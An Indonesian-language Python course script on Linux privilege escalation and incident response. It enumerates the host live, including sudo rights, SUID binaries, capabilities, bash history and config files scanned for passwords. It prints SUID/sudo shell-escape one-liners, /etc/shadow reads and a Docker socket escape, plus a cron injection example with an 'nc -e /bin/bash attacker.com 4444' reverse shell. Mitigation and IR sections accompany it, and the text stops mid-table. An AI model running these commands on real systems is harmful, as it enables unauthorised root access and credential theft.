#!/usr/bin/env python3
"""Sesi 21: Privilege Escalation & Incident Response"""

import subprocess
import sys
import os
import stat
import pwd
import grp
import glob
from datetime import datetime


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 21")
    print("  Privilege Escalation & Incident Response")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name):
    try:
        subprocess.check_output([name, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        try:
            subprocess.check_output(["which", name], stderr=subprocess.STDOUT, timeout=5)
            return "✅ TERINSTAL"
        except (subprocess.CalledProcessError, FileNotFoundError, OSError):
            return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── [1] User Info ──
def user_info():
    section(1, "USER & PRIVILEGE INFORMATION")

    print("""
  💡 Langkah pertama privesc: kenali siapa kamu!
     Ibarat TAMU HOTEL — kamu harus tau lantai berapa kamu sekarang.
    """)

    print(f"  {'Parameter':<30} {'Command':<35} {'Informasi':<45}")
    print(f"  {'─' * 110}")
    info_cmds = [
        ("Current User",     "whoami",    "Nama user yang sedang login"),
        ("User ID & Groups", "id",        "UID, GID, dan group membership"),
        ("Effective User",   "who -m",    "User asal login (jika sudo/su)"),
        ("All Logged In",    "who",       "Semua user yang sedang login"),
        ("Last Logins",      "last",      "Riwayat login user"),
        ("Sudo Privileges",  "sudo -l",   "Command apa yg bisa dijalankan via sudo"),
        ("User Groups",      "groups",    "Group membership dari user"),
        ("Environment",      "env",       "Environment variables — kadang ada password!"),
    ]
    for ic in info_cmds:
        print(f"  {ic[0]:<30} {ic[1]:<35} {ic[2]:<45}")

    print()

    # Live checks
    print("  🔧 CEK LIVE DI SISTEM INI:")
    print()

    # whoami
    try:
        user = subprocess.check_output(["whoami"], timeout=5).decode().strip()
        print(f"     👤 Current user: {user}")
    except Exception:
        print("     👤 Current user: (gagal cek)")

    # id
    try:
        id_out = subprocess.check_output(["id"], timeout=5).decode().strip()
        print(f"     🆔 id: {id_out}")
    except Exception:
        print("     🆔 id: (gagal cek)")

    # groups
    try:
        groups = subprocess.check_output(["groups"], timeout=5).decode().strip()
        print(f"     👥 Groups: {groups}")
    except Exception:
        print("     👥 Groups: (gagal cek)")

    # sudo -l
    try:
        sudo_l = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=5)
        if sudo_l.returncode == 0:
            output = sudo_l.stdout.strip() or sudo_l.stderr.strip()
            print(f"     🔓 sudo -l: {output[:150]}")
        else:
            print(f"     🔓 sudo -l: {sudo_l.stderr.strip()[:100]}")
    except Exception:
        print("     🔓 sudo -l: (gagal atau tidak punya akses)")

    print()

    print("""
  🔥 DARI SINI KITA TAU:
     • Apakah user punya akses sudo?
     • Group apa saja yang diikuti user?
     • Apakah user bisa escalate privilege?

     💡 TAMU HOTEL: Kamu tamu di lantai 2 (www-data).
        Tujuan: Dapet kunci kamar MANAJER (root)!
    """)


# ── [2] OS & Kernel Info ──
def os_info():
    section(2, "OS & KERNEL INFORMATION")

    print("""
  💡 Kernel exploit adalah salah satu cara privesc.
     Cari versi kernel → cari CVE → exploit!
    """)

    # uname -a
    try:
        uname = subprocess.check_output(["uname", "-a"], timeout=5).decode().strip()
        print(f"  🔧 uname -a: {uname}")
    except Exception:
        print("  🔧 uname -a: (gagal)")

    print()

    # Kernel version parse
    print("  🔥 PARSING KERNEL VERSION:")
    try:
        kernel_release = subprocess.check_output(["uname", "-r"], timeout=5).decode().strip()
        arch = subprocess.check_output(["uname", "-m"], timeout=5).decode().strip()
        print(f"     Kernel release: {kernel_release}")
        print(f"     Architecture:   {arch}")
        print()

        # CVE search suggestion
        kernel_parts = kernel_release.split("-")
        kernel_ver = kernel_parts[0]

        print(f"  📌 Cari CVE untuk kernel {kernel_ver}:")
        print(f"     https://www.exploit-db.com/search?q={kernel_ver}")
        print(f"     https://google.com/search?q={kernel_ver}+privilege+escalation+exploit")
        print(f"     https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=linux+kernel+{kernel_ver}")
        print()

        print(f"  {'Kernel':<20} {'CVE Terkenal':<35} {'Exploit Name':<30} {'Status':<12}")
        print(f"  {'─' * 97}")
        kernels = [
            ("2.6.x",   "CVE-2009-1185",   "udev",                 "🚫 Usang"),
            ("3.8.x",   "CVE-2014-3153",   "Towelroot (futex)",    "🚫 Usang"),
            ("3.13.x",  "CVE-2015-1328",   "overlayfs",            "🚫 Usang"),
            ("3.19.x",  "CVE-2016-5195",   "DirtyCow",             "🚫 Usang"),
            ("4.4.x",   "CVE-2017-1000112","UFO Stack",            "🚫 Usang"),
            ("4.8.x",   "CVE-2016-8655",   "af_packet",            "🚫 Usang"),
            ("4.13.x",  "CVE-2017-5123",   "waitid() bypass",      "🚫 Usang"),
            ("4.15.x",  "CVE-2018-5333",   "rds_atomic_free",      "🚫 Usang"),
            ("4.20.x",  "CVE-2019-8912",   "Sock_sendpage",        "🚫 Usang"),
            ("5.3.x",   "CVE-2020-8835",   "bpf",                  "🚫 Usang"),
            ("5.8.x",   "CVE-2021-22555",  "Netfilter overflow",   "🚫 Usang"),
            ("5.10.x",  "CVE-2022-0847",   "DirtyPipe",            "🚫 Usang"),
            ("5.15.x",  "CVE-2023-0386",   "FUSE mount",           "⚠️ Mungkin"),
            ("6.1.x",   "CVE-2024-1086",   "Netfilter nf_tables",  "⚠️ Baru"),
        ]
        for k in kernels:
            print(f"  {k[0]:<20} {k[1]:<35} {k[2]:<30} {k[3]:<12}")
    except Exception as e:
        print(f"     Error: {e}")

    print()

    # OS release
    print("  🔧 OS RELEASE:")
    for f in ["/etc/os-release", "/etc/lsb-release", "/etc/debian_version"]:
        if os.path.exists(f):
            try:
                with open(f) as fh:
                    for line in fh:
                        if "=" in line:
                            print(f"     {line.strip()}")
            except Exception:
                pass

    print()

    # /proc/version
    print("  🔧 /proc/version:")
    try:
        with open("/proc/version") as f:
            print(f"     {f.read().strip()}")
    except Exception:
        print("     (tidak bisa baca)")

    print()

    # Filesystem info
    print("  🔧 FILESYSTEM & MOUNTS:")
    try:
        df_result = subprocess.check_output(["df", "-h"], timeout=5).decode()
        lines = df_result.strip().split("\n")
        print(f"     {'Filesystem':<30} {'Size':<8} {'Used':<8} {'Avail':<8} {'Use%':<8} {'Mounted':<20}")
        print(f"     {'─' * 82}")
        for line in lines[1:]:
            if line.strip():
                parts = line.split()
                if len(parts) >= 6:
                    print(f"     {parts[0]:<30} {parts[1]:<8} {parts[2]:<8} {parts[3]:<8} {parts[4]:<8} {parts[5]:<20}")
    except Exception:
        print("     (gagal cek)")
    print()


# ── [3] SUID Binaries ──
def suid_binaries():
    section(3, "SUID BINARIES — JALANKAN SEBAGAI OWNER")

    print("""
  💡 SUID (Set User ID) membuat binary jalan sebagai PEMILIK file,
     BUKAN sebagai user yang menjalankannya.
     Ibarat: Karyawan biasa bisa buka brankas kalo ada kunci SUID!

  🔥 Cari SUID binary dengan:
     find / -perm -4000 -type f 2>/dev/null
    """)

    print("  🔧 LIVE SCAN SUID BINARIES:")
    try:
        result = subprocess.run(
            ["find", "/", "-perm", "-4000", "-type", "f"],
            capture_output=True, text=True, timeout=15
        )
        suids = result.stdout.strip().split("\n")
        suids = [s for s in suids if s.strip()]

        if suids:
            print(f"     Ditemukan {len(suids)} SUID binary!")
            print()
            print(f"     {'Binary':<55} {'Owner':<15}")
            print(f"     {'─' * 70}")
            for suid in suids[:25]:  # Show first 25
                try:
                    st = os.stat(suid)
                    owner = pwd.getpwuid(st.st_uid).pw_name
                    print(f"     {suid:<55} {owner:<15}")
                except Exception:
                    print(f"     {suid:<55} {'?':<15}")
            if len(suids) > 25:
                print(f"     ... dan {len(suids) - 25} binary lainnya")
        else:
            print("     Tidak ada SUID binary ditemukan (atau tidak punya akses)")
    except Exception as e:
        print(f"     Error: {e}")

    print()

    print("  🔥 DANGEROUS SUID BINARIES (bisa privesc):")
    print()
    print(f"  {'Binary':<25} {'Cara Exploit':<60}")
    print(f"  {'─' * 85}")
    dangerous = [
        ("nmap",       "nmap --interactive → !sh (versi lawas)"),
        ("vim",        "vim -c ':!/bin/bash'"),
        ("find",       "find . -exec /bin/bash -p \\;"),
        ("python",     "python -c 'import os; os.system(\"/bin/bash\")'"),
        ("less/more",  "less /etc/passwd → !/bin/bash"),
        ("bash",       "bash -p (preserves EUID, not cleared)"),
        ("perl",       "perl -e 'exec \"/bin/bash\";'"),
        ("tcpdump",    "tcpdump -i any -w /tmp/exploit -z /bin/bash"),
        ("base64",     "LFILE=/etc/shadow; base64 \"$LFILE\" | base64 -d"),
        ("cp",         "Copy /etc/shadow ke /tmp, crack offline"),
        ("awk",        "awk 'BEGIN {system(\"/bin/bash\")}'"),
        ("env",        "env /bin/bash (preserve privileged environment)"),
    ]
    for d in dangerous:
        print(f"  {d[0]:<25} {d[1]:<60}")

    print()

    print("""
  💡 Jika binary SUID adalah milik root, dan binary itu bisa
     execute shell — SELAMAT! Kamu langsung dapet root shell!

  📌 MITIGASI:
     • Hapus SUID bit dari binary yang tidak perlu
     • Gunakan: chmod u-s /usr/bin/nmap /usr/bin/vim /usr/bin/python
     • Audit: find / -perm -4000 -type f -ls
    """)


# ── [4] SUDO Abuse ──
def sudo_abuse():
    section(4, "SUDO ABUSE — EXECUTE COMMANDS AS ROOT")

    print("""
  💡 sudo -l menampilkan command apa saja yang bisa dijalankan
     dengan privilege root oleh user saat ini.
    """)

    print("  🔧 CEK SUDO PRIVILEGES:")
    try:
        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            output = result.stdout.strip() or result.stderr.strip()
            print(f"     Output: {output[:500]}")
        else:
            print(f"     {result.stderr.strip()[:200]}")
    except Exception as e:
        print(f"     Error: {e}")

    print()

    print("  🔥 DANGEROUS SUDO COMMANDS:")
    print()
    print(f"  {'Command':<25} {'Exploit':<60} {'GTFOBins':<12}")
    print(f"  {'─' * 97}")
    sudo_danger = [
        ("find",       "sudo find . -exec /bin/bash \\;",                "✅ Ada"),
        ("vim/vi",     "sudo vim -c ':!/bin/bash'",                     "✅ Ada"),
        ("less/more",  "sudo less /etc/passwd → !/bin/bash",            "✅ Ada"),
        ("nmap",       "sudo nmap --interactive → !sh",                "✅ Ada"),
        ("python/perl","sudo python -c 'import os;os.system(\"/bin/bash\")'", "✅ Ada"),
        ("man",         "sudo man man → !/bin/bash",                    "✅ Ada"),
        ("awk",         "sudo awk 'BEGIN {system(\"/bin/bash\")}'",      "✅ Ada"),
        ("tcpdump",    "sudo tcpdump -z /bin/bash -w /dev/null",       "✅ Ada"),
        ("pip",        "sudo pip install --no-cache-dir mal-pkg --target=/tmp", "✅ Ada"),
        ("npm/node",   "sudo node -e 'require(\"child_process\").execSync(\"/bin/bash\")'", "✅ Ada"),
    ]
    for sd in sudo_danger:
        print(f"  {sd[0]:<25} {sd[1]:<60} {sd[2]:<12}")

    print()

    print("""
  💡 GTFOBins (https://gtfobins.github.io) adalah referensi LENGKAP
     untuk exploitasi SUID/SUDO binary.

  📌 TIPS:
     • Selalu jalankan sudo -l setelah kompromi.
     • Jika ada command berbahaya di sudoers → ROOT dalam 1 command!
     • GTFOBins punya cheat sheet untuk TIDAK SEMUA binary, cek dulu!
    """)


# ── [5] Cron Jobs ──
def cron_jobs():
    section(5, "CRON JOBS — TASK TERJADWAL")

    print("""
  💡 Cron job adalah task yang berjalan otomatis pada waktu tertentu.
     Jika cron job berjalan sebagai root dan script-nya writable → PRIVESC!
    """)

    # Check /etc/crontab
    print("  🔧 /etc/crontab:")
    if os.path.exists("/etc/crontab"):
        try:
            with open("/etc/crontab") as f:
                content = f.read()
                print(f"     {content[:500]}")
        except Exception as e:
            print(f"     Error: {e}")
    else:
        print("     File tidak ada (atau tidak bisa baca)")
    print()

    # Check cron dirs
    print("  🔧 CRON DIRECTORIES:")
    cron_dirs = ["/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly", "/etc/cron.d"]
    for cd in cron_dirs:
        if os.path.isdir(cd):
            try:
                files = os.listdir(cd)
                print(f"     {cd}/: {', '.join(files[:10]) if files else '(kosong)'}")
            except Exception as e:
                print(f"     {cd}/: Error: {e}")
    print()

    # Check writable cron scripts
    print("  🔥 CEK WRITABLE CRON SCRIPTS:")
    writable_found = False
    for cd in cron_dirs:
        if os.path.isdir(cd):
            try:
                for root, dirs, files in os.walk(cd):
                    for f in files:
                        fpath = os.path.join(root, f)
                        try:
                            st = os.stat(fpath)
                            # Check if world-writable
                            if st.st_mode & stat.S_IWOTH:
                                print(f"     ⚠️  WORLD-WRITABLE: {fpath}")
                                writable_found = True
                        except Exception:
                            pass
            except Exception:
                pass
    if not writable_found:
        print("     ✅ Tidak ada cron script yang world-writable (aman)")
    print()

    print(f"  {'File/Directory':<35} {'Kegunaan':<60}")
    print(f"  {'─' * 95}")
    cron_info = [
        ("/etc/crontab",               "Main crontab file — jadwal sistem"),
        ("/etc/cron.d/",               "Cron job per-package atau custom"),
        ("/etc/cron.hourly/",          "Script setiap jam"),
        ("/etc/cron.daily/",           "Script setiap hari"),
        ("/etc/cron.weekly/",          "Script setiap minggu"),
        ("/etc/cron.monthly/",         "Script setiap bulan"),
        ("/var/spool/cron/crontabs/",  "Crontab per-user"),
        ("/etc/anacrontab",            "Anacron — untuk sistem yang tidak 24/7"),
    ]
    for ci in cron_info:
        print(f"  {ci[0]:<35} {ci[1]:<60}")

    print("""
  🔥 ATTACK PATTERN:
     1. Temukan cron job yang jalan sebagai root
     2. Cek apakah script cron job writable oleh user
     3. Inject reverse shell / backdoor ke script
     4. Tunggu cron job jalan → DAPET ROOT!

     💡 Contoh: echo 'chmod u+s /bin/bash' >> /etc/cron.daily/backup
     💡 Atau: echo 'nc -e /bin/bash attacker.com 4444' >> script.sh
    """)


# ── [6] Network & Listening Services ──
def network_services():
    section(6, "NETWORK & LISTENING SERVICES")

    print("""
  💡 Service yang listening di localhost kadang bisa di-exploit
     untuk privesc. Cek apa yang berjalan!
    """)

    print("  🔧 LISTENING SERVICES:")
    tools_net = [
        ("ss -tlnp",     "Socket statistics — TCP listening"),
        ("ss -ulnp",     "Socket statistics — UDP listening"),
        ("netstat -tulpn","Network statistics (jika netstat ada)"),
        ("lsof -i -P -n","List open files — network sockets"),
    ]
    for tn in tools_net:
        cmd = tn[0].split()[0]
        avail = check_tool(cmd)
        print(f"     {tn[0]:<30} {avail:<15} {tn[1]:<40}")
    print()

    # Try ss
    print("  🔧 CEK DENGAN ss -tlnp:")
    try:
        result = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=10)
        if result.stdout:
            lines = result.stdout.strip().split("\n")
            print(f"     {'State':<12} {'Recv-Q':<8} {'Send-Q':<8} {'Local':<35} {'Peer':<20} {'Process':<30}")
            print(f"     {'─' * 113}")
            for line in lines[1:]:
                if line.strip():
                    print(f"     {line}")
    except Exception as e:
        print(f"     Error: {e}")
    print()

    # /proc/net/tcp
    print("  🔧 /proc/net/tcp (raw kernel table):")
    try:
        with open("/proc/net/tcp") as f:
            lines = f.readlines()
            print(f"     {'sl':<6} {'local_address':<28} {'rem_address':<28} {'st':<6} {'uid':<8}")
            print(f"     {'─' * 76}")
            for line in lines[1:11]:
                parts = line.split()
                if len(parts) >= 8:
                    print(f"     {parts[0]:<6} {parts[1]:<28} {parts[2]:<28} {parts[3]:<6} {parts[7]:<8}")
    except Exception as e:
        print(f"     Error: {e}")
    print()

    # Listening services interpretation
    print("  🔥 PORT INTERPRETATION:")
    print()
    print(f"  {'Port':<10} {'Service Umum':<20} {'Exploit Potensial':<45}")
    print(f"  {'─' * 75}")
    ports = [
        ("22",    "SSH",          "Brute force, CVE (if version vulnerable)"),
        ("80",    "HTTP",         "Web app vuln (SQLi, LFI, RCE)"),
        ("443",   "HTTPS",        "Web app via SSL"),
        ("3306",  "MySQL",        "Default creds, SQL injection"),
        ("5432",  "PostgreSQL",   "Default creds, weak auth"),
        ("6379",  "Redis",        "No auth, RCE via cron/crontab"),
        ("27017", "MongoDB",      "No auth default, data exposure"),
        ("8080",  "HTTP-Alt",     "Admin panel, API"),
        ("9200",  "Elasticsearch", "No auth default, data exposure"),
        ("11211", "Memcached",    "No auth, data leakage"),
    ]
    for p in ports:
        print(f"  {p[0]:<10} {p[1]:<20} {p[2]:<45}")
    print()


# ── [7] Password Hunting ──
def password_hunting():
    section(7, "PASSWORD HUNTING — BERBURU KATA SANDI")

    print("""
  💡 Attacker sering meninggalkan (atau menemukan) password
     di file sistem. Ini adalah salah satu cara privesc!
    """)

    print(f"  {'Target':<40} {'Command':<50}")
    print(f"  {'─' * 90}")
    hunts = [
        ("File konfigurasi",              "grep -r 'password' /etc/ 2>/dev/null"),
        ("File .env / .config",           "find / -name '.env' -type f 2>/dev/null"),
        ("Database config",              "find / -name 'wp-config.php' -type f 2>/dev/null"),
        ("SSH private keys",             "find / -name 'id_rsa' -type f 2>/dev/null"),
        ("History commands",             "cat ~/.bash_history | grep -E '(pass|sudo|ssh)'"),
        ("Known hosts SSH",              "cat ~/.ssh/known_hosts"),
        ("SMB/CIFS credentials",         "grep -r 'username\\|password' /etc/samba/ 2>/dev/null"),
        ("Log files",                    "grep -r 'password' /var/log/ 2>/dev/null | head -20"),
        ("Backup files",                 "find / -name '*.bak' -o -name '*.backup' 2>/dev/null"),
        ("KeePass/Database files",       "find / -name '*.kdbx' -o -name '*.kdb' 2>/dev/null"),
    ]
    for h in hunts:
        print(f"  {h[0]:<40} {h[1]:<50}")

    print()

    # Check .bash_history of current user
    print("  🔧 CEK .bash_history (current user):")
    home = os.path.expanduser("~")
    hist_path = os.path.join(home, ".bash_history")
    if os.path.exists(hist_path):
        try:
            with open(hist_path) as f:
                lines = f.readlines()
                sensitive = [l.strip() for l in lines if any(kw in l.lower() for kw in
                            ["password", "passwd", "sudo", "ssh", "key", "secret", "token"])]
                if sensitive:
                    print(f"     Ditemukan {len(sensitive)} baris sensitif:")
                    for s in sensitive[:15]:
                        print(f"     → {s}")
                else:
                    print("     Tidak ada baris sensitif (atau history kosong)")
        except Exception as e:
            print(f"     Error: {e}")
    else:
        print("     File .bash_history tidak ditemukan")
    print()

    # Check for config files
    print("  🔥 COMMON CONFIG FILES WITH PASSWORDS:")
    config_files = [
        "/etc/mysql/debian.cnf",
        "/etc/mysql/my.cnf",
        "/etc/postgresql/*/main/pg_hba.conf",
        "/etc/redis/redis.conf",
        "/etc/mongod.conf",
        "/etc/nginx/nginx.conf",
        "/etc/httpd/conf/httpd.conf",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
    ]
    for cf in config_files:
        expanded = glob.glob(cf)
        for match in expanded:
            try:
                with open(match) as f:
                    content = f.read()
                    for line in content.split("\n"):
                        if "password" in line.lower() or "pass" in line.lower():
                            print(f"     ⚠️  {match}: {line.strip()[:80]}")
            except Exception:
                pass

    print("""
  💡 FILOSOFI: Password itu seperti permen — orang taruh di
     laci, di bawah meja, di saku jaket. Selalu cek semua tempat!

  📌 MITIGASI:
     • Jangan simpan password di file config plaintext
     • Gunakan environment variable atau vault (Vault, KMS)
     • Batasi akses file .env, wp-config.php, dll
    """)


# ── [8] Capabilities ──
def capabilities():
    section(8, "LINUX CAPABILITIES")

    print("""
  💡 Linux Capabilities adalah alternatif SUID yang lebih granular.
     Binary bisa punya CAP_SYS_ADMIN tanpa perlu SUID root.
     Tapi ini bisa disalahgunakan!
    """)

    print("  🔧 CEK CAPABILITIES DENGAN getcap:")
    getcap_status = check_tool("getcap")
    print(f"     getcap: {getcap_status}")
    if getcap_status == "✅ TERINSTAL":
        try:
            result = subprocess.run(
                ["getcap", "-r", "/"],
                capture_output=True, text=True, timeout=30
            )
            if result.stdout.strip():
                lines = result.stdout.strip().split("\n")
                print(f"     Ditemukan {len(lines)} file dengan capabilities:")
                for line in lines[:20]:
                    print(f"     {line}")
                if len(lines) > 20:
                    print(f"     ... dan {len(lines) - 20} file lainnya")
            else:
                print("     Tidak ada file dengan capabilities (atau tidak punya akses)")
        except Exception as e:
            print(f"     Error: {e}")
    else:
        print("     Install: sudo apt install libcap2-bin")
    print()

    print(f"  {'Capability':<30} {'Dampak':<50} {'Contoh Binary':<30}")
    print(f"  {'─' * 110}")
    caps = [
        ("CAP_SYS_ADMIN",       "Almost root — mount, namespace, dll",                     "python, perl"),
        ("CAP_NET_RAW",         "Raw socket — packet injection, ARP spoof",                "ping, nmap"),
        ("CAP_NET_ADMIN",       "Network admin — firewall, interface config",              "iptables, ifconfig"),
        ("CAP_DAC_OVERRIDE",    "Bypass file permission — baca /etc/shadow",               "cat, cp, find"),
        ("CAP_DAC_READ_SEARCH", "Baca semua file (no write)",                              "less, tail, head"),
        ("CAP_SETUID",          "Set UID — escalate ke root",                              "python, perl, su"),
        ("CAP_SETGID",          "Set GID — escalate group",                                "chown, python"),
        ("CAP_SYS_PTRACE",      "PTrace — inject process, memory read",                    "gdb, strace"),
        ("CAP_SYS_MODULE",     "Load kernel module — rootkit!",                            "insmod, modprobe"),
        ("CAP_CHOWN",           "Change ownership — chown file apapun",                    "chown"),
        ("CAP_FOWNER",          "Bypass ownership check — set SUID",                        "chmod"),
    ]
    for c in caps:
        print(f"  {c[0]:<30} {c[1]:<50} {c[2]:<30}")

    print()

    print("""
  🔥 EXPLOIT EXAMPLE — python with CAP_DAC_OVERRIDE:
     $ python -c 'import os; os.system(\"cat /etc/shadow\")'

  🔥 EXPLOIT EXAMPLE — perl with CAP_SETUID:
     $ perl -e 'posix::setuid(0); exec \"/bin/bash\";'

  📌 MITIGASI:
     • Audit capabilities: getcap -r / 2>/dev/null
     • Hapus capabilities tidak perlu: setcap -r /path/to/binary
     • Gunakan user namespace untuk kontainer
    """)


# ── [9] Incident Response ──
def incident_response():
    section(9, "INCIDENT RESPONSE — SAAT TERJADI INSIDEN")

    print("""
  💡 Incident Response (IR) adalah langkah-langkah yang dilakukan
     SAAT atau SETELAH terjadi serangan keamanan.

   ╔══════════════════════════════════════════════════════════╗
   ║  🚨 RESPON KEAMANAN: 6 FASE                            ║
   ║                                                        ║
   ║  1. Preparation — Siap sebelum serangan                  ║
   ║  2. Identification — Deteksi insiden                    ║
   ║  3. Containment — Isolasi dampak                        ║
   ║  4. Eradication — Hapus root cause                      ║
   ║  5. Recovery — Kembalikan ke normal                    ║
   ║  6. Lessons Learned — Evaluasi & perbaiki               ║
   ╚══════════════════════════════════════════════════════════╝
    """)

    print("  🔧 CEK LOG & USER ACTIVITY:")
    print()

    # last command
    print("  👉 last login:")
    try:
        last_out = subprocess.run(["last", "-10"], capture_output=True, text=True, timeout=10)
        if last_out.stdout:
            for line in last_out.stdout.split("\n")[:15]:
                print(f"     {line}")
    except Exception:
        print("     (gagal)")
    print()

    # auth.log
    print("  👉 /var/log/auth.log (recent lines):")
    auth_logs = ["/var/log/auth.log", "/var/log/secure"]
    auth_found = False
    for al in auth_logs:
        if os.path.exists(al):
            try:
                with open(al) as f:
                    lines = f.readlines()
                    for line in lines[-15:]:
                        print(f"     {line.strip()[:120]}")
                auth_found = True
                break
            except Exception as e:
                print(f"     Error baca {al}: {e}")
    if not auth_found:
        print("     Tidak bisa baca auth log (permission atau tidak ada)")
    print()

    # ps aux
    print("  👉 ps aux (process overview):")
    try:
        ps_out = subprocess.run(["ps", "aux", "--sort=-%mem"], capture_output=True, text=True, timeout=10)
        lines = ps_out.stdout.strip().split("\n")
        print(f"     {'USER':<10} {'PID':<7} {'%CPU':<6} {'%MEM':<6} {'COMMAND':<60}")
        print(f"     {'─' * 89}")
        for line in lines[:12]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                print(f"     {parts[0]:<10} {parts[1]:<7} {parts[2]:<6} {parts[3]:<6} {parts[10]:<60}")
            else:
                print(f"     {line}")
    except Exception:
        print("     (gagal)")
    print()

    # lsof
    print("  👉 lsof (open files — cari file mencurigakan):")
    try:
        lsof_out = subprocess.run(
            ["lsof", "-i", "-P", "-n"],
            capture_output=True, text=True, timeout=10
        )
        if lsof_out.stdout:
            lines = lsof_out.stdout.strip().split("\n")
            for line in lines[:15]:
                print(f"     {line[:120]}")
            if len(lines) > 15:
                print(f"     ... ({len(lines) - 15} more lines)")
        else:
            print("     Tidak ada network connection (atau tidak punya akses)")
    except Exception:
        print("     (gagal atau lsof tidak terinstall)")
    print()

    print("  🔥 IR CHECKLIST:")
    ir_items = [
        "✅ 1. IDENTIFIKASI: Cek user mencurigakan (who, last, /etc/passwd baru)",
        "✅ 2. IDENTIFIKASI: Cek process aneh (ps aux, htop CPU tinggi)",
        "✅ 3. IDENTIFIKASI: Cek koneksi network (ss -tlnp, lsof -i)",
        "✅ 4. CONTAINMENT: Isolasi server (iptables drop all, revoke SSH keys)",
        "✅ 5. CONTAINMENT: Backup evidence (dd disk, memory capture)",
        "✅ 6. ERADICATION: Hapus binary backdoor (/tmp/, /dev/shm/, ~/.ssh/)",
        "✅ 7. ERADICATION: Kill malicious process (kill -9 PID)",
        "✅ 8. RECOVERY: Restore dari backup clean",
        "✅ 9. RECOVERY: Reset semua password (user, database, API)",
        "✅ 10. LESSONS: Analisis root cause, patch vulnerability",
    ]
    for item in ir_items:
        print(f"     {item}")
    print()


# ── [10] Persistence Detection ──
def persistence_detection():
    section(10, "PERSISTENCE DETECTION — BACKDOOR PADA SISTEM")

    print("""
  💡 Attacker biasanya memasang persistence agar tetap punya akses
     meski server direstart. Ini cara mendeteksinya!
    """)

    print(f"  {'Metode':<30} {'Lokasi':<45} {'Cara Deteksi':<45}")
    print(f"  {'─' * 120}")
    persistence = [
        ("SSH Authorized Keys",  "~/.ssh/authorized_keys",           "Cek key mencurigakan di authorized_keys"),
        ("SSH Key Backdoor",     "~/.ssh/id_rsa.pub (new)",          "Cek file .ssh yang aneh (timestamp)"),
        ("Cron Job Backdoor",    "/etc/crontab, /etc/cron.d/",       "Cek crontab mencurigakan"),
        ("Systemd Service",      "/etc/systemd/system/*.service",    "systemctl list-units --state=enabled"),
        ("Init.d Script",        "/etc/init.d/*",                     "Cek script aneh di init.d"),
        ("Bash Profile",         "~/.bashrc, ~/.bash_profile",       "Cek alias berbahaya atau reverse shell"),
        ("Web Shell",            "/var/www/html/*.php (new)",         "Cari file PHP dengan fungsi berbahaya"),
        ("Dynamic Linker",       "/etc/ld.so.preload",               "Cek LD_PRELOAD persistent"),
        ("Kernel Module",        "/lib/modules/$(uname -r)/",        "Cek module mencurigakan (lsmod)"),
        ("SUID Backdoor",        "/tmp/, /dev/shm/",                 "Cari SUID binary di direktori aneh"),
        ("Network Backdoor",     "Listening reverse shell port",     "Cek port aneh dengan ss -tlnp"),
        ("Container Escape",     "/var/run/docker.sock",             "Cek akses Docker socket"),
    ]
    for p in persistence:
        print(f"  {p[0]:<30} {p[1]:<45} {p[2]:<45}")

    print()

    # Check SSH authorized_keys
    print("  🔧 CEK SSH AUTHORIZED KEYS:")
    ssh_dirs = glob.glob("/home/*/.ssh/authorized_keys") + glob.glob("/root/.ssh/authorized_keys")
    if ssh_dirs:
        for sd in ssh_dirs:
            try:
                with open(sd) as f:
                    content = f.read()
                    keys = [k for k in content.strip().split("\n") if k.strip() and not k.startswith("#")]
                    if keys:
                        print(f"     {sd}: {len(keys)} key(s) ditemukan")
                        for key in keys[-3:]:
                            parts = key.split()
                            type_str = parts[0] if len(parts) >= 1 else "?"
                            comment = parts[2] if len(parts) >= 3 else "(no comment)"
                            print(f"       → {type_str} ({comment})")
            except Exception:
                pass
    else:
        print("     Tidak ada authorized_keys atau tidak bisa baca")
    print()

    # Check systemd services
    print("  🔧 CEK SYSTEMD SERVICES:")
    try:
        result = subprocess.run(
            ["systemctl", "list-units", "--type=service", "--state=running", "--no-pager"],
            capture_output=True, text=True, timeout=10
        )
        if result.stdout:
            lines = result.stdout.strip().split("\n")
            for line in lines[1:8]:
                print(f"     {line[:120]}")
    except Exception:
        print("     (systemctl tidak tersedia atau gagal)")
    print()


# ── [11] Docker Escape ──
def docker_escape():
    section(11, "DOCKER ESCAPE — KELUAR DARI KONTAINER")

    print("""
  💡 Docker Escape adalah teknik keluar dari kontainer Docker
     untuk mendapatkan akses ke HOST (root di mesin fisik).
    """)

    print("  🔧 CEK APAKAH KITA DI DALAM KONTAINER DOCKER:")
    docker_checks = [
        ("/.dockerenv",               os.path.exists("/.dockerenv")),
        ("/proc/1/cgroup Docker",     False),
        ("Container hostname length", len(os.uname().nodename) == 12 if hasattr(os, 'uname') else False),
    ]

    # Check /proc/1/cgroup
    try:
        with open("/proc/1/cgroup") as f:
            cgroup_content = f.read()
        in_container = "docker" in cgroup_content.lower()
        print(f"     /.dockerenv exists:          {'✅ YA' if docker_checks[0][1] else '❌ TIDAK'}")
        print(f"     /proc/1/cgroup docker:       {'✅ YA' if in_container else '❌ TIDAK'}")
    except Exception:
        print("     /proc/1/cgroup:              ❌ Tidak bisa dibaca")
        in_container = False
    print()

    # Docker socket check
    print("  🔥 DOCKER SOCKET CHECK:")
    docker_socket = "/var/run/docker.sock"
    if os.path.exists(docker_socket):
        print(f"     ✅ DOCKER SOCKET TERDETEKSI! {docker_socket}")
        print("     Jika kita bisa akses ini → ESCAPE!")
        print()
        print("     Exploit: docker run -v /:/mnt -it --privileged alpine chroot /mnt")
    else:
        print(f"     ❌ Docker socket tidak ditemukan di {docker_socket}")
    print()

    print(f"  {'Teknik Escape':<35} {'Cara Kerja':<55} {'Kondisi':<25}")
    print(f"  {'─' * 115}")
    escapes = [
        ("Docker Socket Mount",     "Mount /var/run/docker.sock ke kontainer",      "Socket tersedia di dalam"),
